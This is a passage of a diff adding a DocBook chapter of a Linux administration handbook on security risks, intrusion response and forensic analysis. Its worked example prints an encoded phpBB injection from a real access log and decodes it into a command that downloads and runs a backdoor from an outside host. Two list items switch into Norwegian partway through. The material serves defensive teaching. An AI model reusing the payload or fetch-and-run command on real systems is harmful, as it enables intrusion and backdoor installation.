+			Security is not just a technical problem; more than anything, it is about good practices and understanding the risks. This section reviews some of the more common risks, as well as a few best practices which should, depending on the case, increase security or lessen the impact of a successful attack.
+		</para>
+		 <section>
+			<title>Inherent Risks of Web Applications</title>
+			 <para>
+				The universal character of web applications led to their proliferation. Several are often run in parallel: a webmail, a wiki, some groupware system, forums, a photo gallery, a blog, and so on. Many of those applications rely on the “LAMP” (<emphasis>Linux, Apache, MySQL, PHP</emphasis>) stack. Unfortunately, many of those applications were also written without much consideration for security problems. Data coming from outside is, too often, used with little or no validation. Providing specially-crafted values can be used to subvert a call to a command so that another one is executed instead. Many of the most obvious problems have been fixed as time has passed, but new security problems pop up regularly.
+			</para>
+			 <sidebar> <title><emphasis>VOCABULARY</emphasis> SQL injection</title>
+			 <para>
+				When a program inserts data into SQL queries in an insecure manner, it becomes vulnerable to SQL injections; this name covers the act of changing a parameter in such a way that the actual query executed by the program is different from the intended one, either to damage the database or to access data that should normally not be accessible. <ulink type="block" url="http://en.wikipedia.org/wiki/SQL_Injection" />
+			</para>
+			 <indexterm>
+				<primary>SQL injection</primary>
+			</indexterm>
+			 </sidebar> <para>
+				Updating web applications regularly is therefore a must, lest any cracker (whether a professional attacker or a script kiddy) can exploit a known vulnerability. The actual risk depends on the case, and ranges from data destruction to arbitrary code execution, including web site defacement.
+			</para>
+
+		</section>
+		 <section>
+			<title>Knowing What To Expect</title>
+			 <para>
+				A vulnerability in a web application is often used as a starting point for cracking attempts. What follows is a short review of possible consequences.
+			</para>
+			 <sidebar> <title><emphasis>QUICK LOOK</emphasis> Filtering HTTP queries</title>
+			 <para>
+				Apache 2 includes modules allowing filtering incoming HTTP queries. This allows blocking some attack vectors. For instance, limiting the length of parameters can prevent buffer overflows. More generally, one can validate parameters before they are even passed to the web application and restrict access along many criteria. This can even be combined with dynamic firewall updates, so that a client infringing one of the rules is banned from accessing the web server for a given period of time.
+			</para>
+			 <para>
+				Setting up these checks can be a long and cumbersome task, but it can pay off when the web application to be deployed has a dubious track record where security is concerned.
+			</para>
+			 <para>
+				<emphasis>mod-security2</emphasis> (in the <emphasis role="pkg">libapache2-mod-security2</emphasis> package) is the main such module. It even comes with many ready-to-use rules of its own (in the <emphasis role="pkg">modsecurity-crs</emphasis> package) that you can easily enable.
+			</para>
+			 <indexterm>
+				<primary><emphasis role="pkg">libapache-mod-security</emphasis></primary>
+			</indexterm>
+			 <indexterm>
+				<primary><emphasis>mod-security</emphasis></primary>
+			</indexterm>
+			 </sidebar> <para>
+				The consequences of an intrusion will have various levels of obviousness depending on the motivations of the attacker. <emphasis>Script-kiddies</emphasis> only apply recipes they find on web sites; most often, they deface a web page or delete data. In more subtle cases, they add invisible contents to web pages so as to improve referrals to their own sites in search engines.
+			</para>
+			 <para>
+				A more advanced attacker will go beyond that. A disaster scenario could go on in the following fashion: the attacker gains the ability to execute commands as the <literal>www-data</literal> user, but executing a command requires many manipulations. To make their life easier, they install other web applications specially designed to remotely execute many kinds of commands, such as browsing the filesystem, examining permissions, uploading or downloading files, executing commands, and even provide a network shell. Often, the vulnerability will allow running a <command>wget</command> command that will download some malware into <filename>/tmp/</filename>, then executing it. The malware is often downloaded from a foreign website that was previously compromised, in order to cover tracks and make it harder to find out the actual origin of the attack.
+			</para>
+			 <para>
+				At this point, the attacker has enough freedom of movement that they often install an IRC <emphasis>bot</emphasis> (a robot that connects to an IRC server and can be controlled by this channel). This bot is often used to share illegal files (unauthorized copies of movies or software, and so on). A determined attacker may want to go even further. The <literal>www-data</literal> account does not allow full access to the machine, and the attacker will try to obtain administrator privileges. Now, this should not be possible, but if the web application was not up-to-date, chances are that the kernel and other programs are outdated too; this sometimes follows a decision from the administrator who, despite knowing about the vulnerability, neglected to upgrade the system since there are no local users. The attacker can then take advantage of this second vulnerability to get root access.
+			</para>
+			 <sidebar> <title><emphasis>VOCABULARY</emphasis> Privilege escalation</title>
+			 <para>
+				This term covers anything that can be used to obtain more permissions than a given user should normally have. The <command>sudo</command> program is designed for precisely the purpose of giving administrative rights to some users. But the same term is also used to describe the act of an attacker exploiting a vulnerability to obtain undue rights.
+			</para>
+			 </sidebar> <para>
+				Now the attacker owns the machine; they will usually try to keep this privileged access for as long as possible. This involves installing a <emphasis>rootkit</emphasis>, a program that will replace some components of the system so that the attacker will be able to obtain the administrator privileges again at a later time; the rootkit also tries hiding its own existence as well as any traces of the intrusion. A subverted <command>ps</command> program will omit to list some processes, <command>netstat</command> will not list some of the active connections, and so on. Using the root permissions, the attacker was able to observe the whole system, but didn't find important data; so they will try accessing other machines in the corporate network. Analyzing the administrator's account and the history files, the attacker finds what machines are routinely accessed. By replacing <command>sudo</command> or <command>ssh</command> with a subverted program, the attacker can intercept some of the administrator's passwords, which they will use on the detected servers… and the intrusion can propagate from then on.
+			</para>
+			 <para>
+				This is a nightmare scenario which can be prevented by several measures. The next few sections describe some of these measures.
+			</para>
+
+		</section>
+		 <section id="sect.choosing-the-software-wisely">
+			<title>Choosing the Software Wisely</title>
+			 <para>
+				Once the potential security problems are known, they must be taken into account at each step of the process of deploying a service, especially when choosing the software to install. Many web sites, such as <literal>SecurityFocus.com</literal>, keep a list of recently-discovered vulnerabilities, which can give an idea of a security track record before some particular software is deployed. Of course, this information must be balanced against the popularity of said software: a more widely-used program is a more tempting target, and it will be more closely scrutinized as a consequence. On the other hand, a niche program may be full of security holes that never get publicized due to a lack of interest in a security audit.
+			</para>
+			 <sidebar> <title><emphasis>VOCABULARY</emphasis> Security audit</title>
+			 <para>
+				A security audit is the process of thoroughly reading and analyzing the source code of some software, looking for potential security vulnerabilities it could contain. Such audits are usually proactive and they are conducted to ensure a program meets certain security requirements.
+			</para>
+			 </sidebar> <para>
+				In the Free Software world, there is generally ample room for choice, and choosing one piece of software over another should be a decision based on the criteria that apply locally. More features imply an increased risk of a vulnerability hiding in the code; picking the most advanced program for a task may actually be counter-productive, and a better approach is usually to pick the simplest program that meets the requirements.
+			</para>
+			 <sidebar> <title><emphasis>VOCABULARY</emphasis> Zero-day exploit</title>
+			 <para>
+				A <emphasis>zero-day exploit</emphasis> attack is hard to prevent; the term covers a vulnerability that is not yet known to the authors of the program.
+			</para>
+			 </sidebar>
+		</section>
+		 <section id="sect.managing-a-machine-as-a-whole">
+			<title>Managing a Machine as a Whole</title>
+			 <para>
+				Most Linux distributions install by default a number of Unix services and many tools. In many cases, these services and tools are not required for the actual purposes for which the administrator set up the machine. As a general guideline in security matters, unneeded software is best uninstalled. Indeed, there is no point in securing an FTP server, if a vulnerability in a different, unused service can be used to get administrator privileges on the whole machine.
+			</para>
+			 <para>
+				By the same reasoning, firewalls will often be configured to only allow access to services that are meant to be publicly accessible.
+			</para>
+			 <para>
+				Current computers are powerful enough to allow hosting several services on the same physical machine. From an economic viewpoint, such a possibility is interesting: only one computer to administrate, lower energy consumption, and so on. From the security point of view, however, such a choice can be a problem. One compromised service can bring access to the whole machine, which in turn compromises the other services hosted on the same computer. This risk can be mitigated by isolating the services. This can be attained either with virtualization (each service being hosted in a dedicated virtual machine or container), or with AppArmor/SELinux (each service daemon having an adequately designed set of permissions).
+			</para>
+
+		</section>
+		 <section id="sect.users-are-players">
+			<title>Users Are Players</title>
+			 <para>
+				Discussing security immediately brings to mind protection against attacks by anonymous crackers hiding in the Internet jungle; but an often-forgotten fact is that risks also come from inside: an employee about to leave the company could download sensitive files on the important projects and sell them to competitors, a negligent salesman could leave their desk without locking their session during a meeting with a new prospect, a clumsy user could delete the wrong directory by mistake, and so on.
+			</para>
+			 <para>
+				The response to these risks can involve technical solutions: no more than the required permissions should be granted to users, and regular backups are a must. But in many cases, the appropriate protection is going to involve training users to avoid the risks.
+			</para>
+			 <sidebar> <title><emphasis>QUICK LOOK</emphasis> <emphasis role="pkg">autolog</emphasis></title>
+			 <para>
+				The <emphasis role="pkg">autolog</emphasis> package provides a program that automatically disconnects inactive users after a configurable delay. It also allows killing user processes that persist after a session ends, thereby preventing users from running daemons.
+			</para>
+			 </sidebar>
+		</section>
+		 <section id="sect.physical-security">
+			<title>Physical Security</title>
+			 <para>
+				There is no point in securing the services and networks if the computers themselves are not protected. Important data deserve being stored on hot-swappable hard disks in RAID arrays, because hard disks fail eventually and data availability is a must. But if any pizza delivery boy can enter the building, sneak into the server room and run away with a few selected hard disks, an important part of security is not fulfilled. Who can enter the server room? Is access monitored? These questions deserve consideration (and an answer) when physical security is being evaluated.
+			</para>
+			 <para>
+				Physical security also includes taking into consideration the risks for accidents such as fires. This particular risk is what justifies storing the backup media in a separate building, or at least in a fire-proof strongbox.
+			</para>
+
+		</section>
+		 <section>
+			<title>Legal Liability</title>
+			 <para>
+				An administrator is, more or less implicitly, trusted by their users as well as the users of the network in general. They should therefore avoid any negligence that malevolent people could exploit.
+			</para>
+			 <para>
+				An attacker taking control of your machine then using it as a forward base (known as a “relay system”) from which to perform other nefarious activities could cause legal trouble for you, since the attacked party would initially see the attack coming from your system, and therefore consider you as the attacker (or as an accomplice). In many cases, the attacker will use your server as a relay to send spam, which shouldn't have much impact (except potentially registration on black lists that could restrict your ability to send legitimate emails), but won't be pleasant nevertheless. In other cases, more important trouble can be caused from your machine, for instance denial of service attacks. This will sometimes induce loss of revenue, since the legitimate services will be unavailable and data can be destroyed; sometimes this will also imply a real cost, because the attacked party can start legal proceedings against you. Rights-holders can sue you if an unauthorized copy of a work protected by copyright law is shared from your server, as well as other companies compelled by service level agreements if they are bound to pay penalties following the attack from your machine.
+			</para>
+			 <para>
+				When these situations occur, claiming innocence is not usually enough; at the very least, you will need convincing evidence showing suspect activity on your system coming from a given IP address. This won't be possible if you neglect the recommendations of this chapter and let the attacker obtain access to a privileged account (root, in particular) and use it to cover their tracks.
+			</para>
+
+		</section>
+
+	</section>
+	 <section id="sect.dealing-with-compromised-machine">
+		<title>Dealing with a Compromised Machine</title>
+		 <para>
+			Despite the best intentions and however carefully designed the security policy, an administrator eventually faces an act of hijacking. This section provides a few guidelines on how to react when confronted with these unfortunate circumstances.
+		</para>
+		 <section>
+			<title>Detecting and Seeing the Cracker's Intrusion</title>
+			 <para>
+				The first step of reacting to cracking is to be aware of such an act. This is not self-evident, especially without an adequate monitoring infrastructure.
+			</para>
+			 <para>
+				Cracking acts are often not detected until they have direct consequences on the legitimate services hosted on the machine, such as connections slowing down, some users being unable to connect, or any other kind of malfunction. Faced with these problems, the administrator needs to have a good look at the machine and carefully scrutinize what misbehaves. This is usually the time when they discover an unusual process, for instance one named <literal>apache</literal> instead of the standard <literal>/usr/sbin/apache2</literal>. If we follow that example, the thing to do is to note its process identifier, and check <filename>/proc/<replaceable>pid</replaceable>/exe</filename> to see what program this process is currently running:
+			</para>
+			 
+<screen>
+<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
+<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
+</screen>
+			 <para>
+				A program installed under <filename>/var/tmp/</filename> and running as the web server? No doubt left, the machine is compromised.
+			</para>
+			 <para>
+				This is only one example, but many other hints can ring the administrator's bell:
+			</para>
+			 <itemizedlist>
+				<listitem>
+					<para>
+						an option to a command that no longer works; the version of the software that the command claims to be doesn't match the version that is supposed to be installed according to <command>dpkg</command>;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						a command prompt or a session greeting indicating that the last connection came from an unknown server on another continent;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						errors caused by the <filename>/tmp/</filename> partition being full, which turned out to be full of illegal copies of movies;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						and so on.
+					</para>
+
+				</listitem>
+
+			</itemizedlist>
+
+		</section>
+		 <section>
+			<title>Putting the Server Off-Line</title>
+			 <para>
+				In any but the most exotic cases, the cracking comes from the network, and the attacker needs a working network to reach their targets (access confidential data, share illegal files, hide their identity by using the machine as a relay, and so on). Unplugging the computer from the network will prevent the attacker from reaching these targets, if they haven't managed to do so yet.
+			</para>
+			 <para>
+				This may only be possible if the server is physically accessible. When the server is hosted in a hosting provider's data center halfway across the country, or if the server is not accessible for any other reason, it's usually a good idea to start by gathering some important information (see <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />, <xref linkend="sect.forensic-analysis" /> and <xref linkend="sect.reconstituting-the-attack-scenario" />), then isolating that server as much as possible by shutting down as many services as possible (usually, everything but <command>sshd</command>). This case is still awkward, since one can't rule out the possibility of the attacker having SSH access like the administrator has; this makes it harder to “clean” the machines.
+			</para>
+
+		</section>
+		 <section id="sect.keeping-everything-that-could-be-used-as-evidence">
+			<title>Keeping Everything that Could Be Used as Evidence</title>
+			 <para>
+				Understanding the attack and/or engaging legal action against the attackers requires taking copies of all the important elements; this includes the contents of the hard disk, a list of all running processes, and a list of all open connections. The contents of the RAM could also be used, but it is rarely used in practice.
+			</para>
+			 <para>
+				In the heat of action, administrators are often tempted to perform many checks on the compromised machine; this is usually not a good idea. Every command is potentially subverted and can erase pieces of evidence. The checks should be restricted to the minimal set (<command>netstat -tupan</command> for network connections, <command>ps auxf</command> for a list of processes, <command>ls -alR /proc/[0-9]*</command> for a little more information on running programs), and every performed check should carefully be written down.
+			</para>
+			 <sidebar> <title><emphasis>CAUTION</emphasis> Hot analysis</title>
+			 <para>
+				While it may seem tempting to analyze the system as it runs, especially when the server is not physically reachable, this is best avoided: quite simply you can't trust the programs currently installed on the compromised system. It's quite possible for a subverted <command>ps</command> command to hide some processes, or for a subverted <command>ls</command> to hide files; sometimes even the kernel is compromised!
+			</para>
+			 <para>
+				If such a hot analysis is still required, care should be taken to only use known-good programs. A good way to do that would be to have a rescue CD with pristine programs, or a read-only network share. However, even those countermeasures may not be enough if the kernel itself is compromised.
+			</para>
+			 </sidebar> <para>
+				Once the “dynamic” elements have been saved, the next step is to store a complete image of the hard-disk. Making such an image is impossible if the filesystem is still evolving, which is why it must be remounted read-only. The simplest solution is often to halt the server brutally (after running <command>sync</command>) and reboot it on a rescue CD. Each partition should be copied with a tool such as <command>dd</command>; these images can be sent to another server (possibly with the very convenient <command>nc</command> tool). Another possibility may be even simpler: just get the disk out of the machine and replace it with a new one that can be reformatted and reinstalled.
+			</para>
+
+		</section>
+		 <section>
+			<title>Re-installing</title>
+			 <indexterm>
+				<primary>backdoor</primary>
+			</indexterm>
+			 <para>
+				The server should not be brought back on line without a complete reinstallation. If the compromise was severe (if administrative privileges were obtained), there is almost no other way to be sure that we get rid of everything the attacker may have left behind (particularly <emphasis>backdoors</emphasis>). Of course, all the latest security updates must also be applied so as to plug the vulnerability used by the attacker. Ideally, analyzing the attack should point at this attack vector, so one can be sure of actually fixing it; otherwise, one can only hope that the vulnerability was one of those fixed by the updates.
+			</para>
+			 <para>
+				Reinstalling a remote server is not always easy; it may involve assistance from the hosting company, because not all such companies provide automated reinstallation systems. Care should be taken not to reinstall the machine from backups taken later than the compromise. Ideally, only data should be restored, the actual software should be reinstalled from the installation media.
+			</para>
+
+		</section>
+		 <section id="sect.forensic-analysis">
+			<title>Forensic Analysis</title>
+			 <para>
+				Now that the service has been restored, it is time to have a closer look at the disk images of the compromised system in order to understand the attack vector. When mounting these images, care should be taken to use the <literal>ro,nodev,noexec,noatime</literal> options so as to avoid changing the contents (including timestamps of access to files) or running compromised programs by mistake.
+			</para>
+			 <para>
+				Retracing an attack scenario usually involves looking for everything that was modified and executed:
+			</para>
+			 <itemizedlist>
+				<listitem>
+					<para>
+						<filename>.bash_history</filename> files often provide for a very interesting read;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						so does listing files that were recently created, modified or accessed;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<command>strings</command>-kommandoen kan være til hjelp med å identifisere programmer installert av angriperen, ved å ekstrahere strenger fra binærfiler;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						Loggfilene i <filename>/var/log/</filename> gjør det ofte mulig å rekonstruere hendelsesrekkefølgen;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						special-purpose tools also allow restoring the contents of potentially deleted files, including log files that attackers often delete.
+					</para>
+
+				</listitem>
+
+			</itemizedlist>
+			 <para>
+				Some of these operations can be made easier with specialized software. In particular, the <emphasis role="pkg">sleuthkit</emphasis> package provides many tools to analyze a filesystem. Their use is made easier by the <emphasis>Autopsy Forensic Browser</emphasis> graphical interface (in the <emphasis role="pkg">autopsy</emphasis> package).
+			</para>
+			 <indexterm>
+				<primary>Autopsy Forensic Browser</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>The Sleuth Kit</primary>
+			</indexterm>
+
+		</section>
+		 <section id="sect.reconstituting-the-attack-scenario">
+			<title>Reconstituting the Attack Scenario</title>
+			 <para>
+				All the elements collected during the analysis should fit together like pieces in a jigsaw puzzle; the creation of the first suspect files is often correlated with logs proving the breach. A real-world example should be more explicit than long theoretical ramblings.
+			</para>
+			 <para>
+				The following log is an extract from an Apache <filename>access.log</filename>:
+			</para>
+			 
+<programlisting>
+www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+</programlisting>
+			 <para>
+				This example matches exploitation of an old security vulnerability in phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" />
+			</para>
+			 <para>
+				Decoding this long URL leads to understanding that the attacker managed to run some PHP code, namely: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. Indeed, a <filename>bd</filename> file was found in <filename>/tmp/</filename>. Running <command>strings /mnt/tmp/bd</command> returns, among other strings, <literal>PsychoPhobia Backdoor is starting...</literal>. This really looks like a backdoor.
+			</para>
+			 <para>
+				Some time later, this access was used to download, install and run an IRC <emphasis>bot</emphasis> that connected to an underground IRC network. The bot could then be controlled via this protocol and instructed to download files for sharing. This program even has its own log file:
+			</para>
+			 
+<programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
+** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
+** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
+** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
+** 2004-11-29-19:50:20: DCC CHAT Correct password
+(...)
+** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
+(...)
+** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
+(...)
+** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
+(...)
+** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)
+</programlisting>
+			 <para>
+				These traces show that two video files have been stored on the server by way of the 82.50.72.202 IP address.
+			</para>
+			 <para>
+				In parallel, the attacker also downloaded a pair of extra files, <filename>/tmp/pt</filename> and <filename>/tmp/loginx</filename>. Running these files through <command>strings</command> leads to strings such as <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> and <foreignphrase>Now wait for suid shell...</foreignphrase>. These look like programs exploiting local vulnerabilities to obtain administrative privileges. Did they reach their target? In this case, probably not, since no files seem to have been modified after the initial breach.
+			</para>
+			 <para>
+				In this example, the whole intrusion has been reconstructed, and it can be deduced that the attacker has been able to take advantage of the compromised system for about three days; but the most important element in the analysis is that the vulnerability has been identified, and the administrator can be sure that the new installation really does fix the vulnerability.
+			</para>
+
+		</section>
+
+	</section>
+</chapter>
+
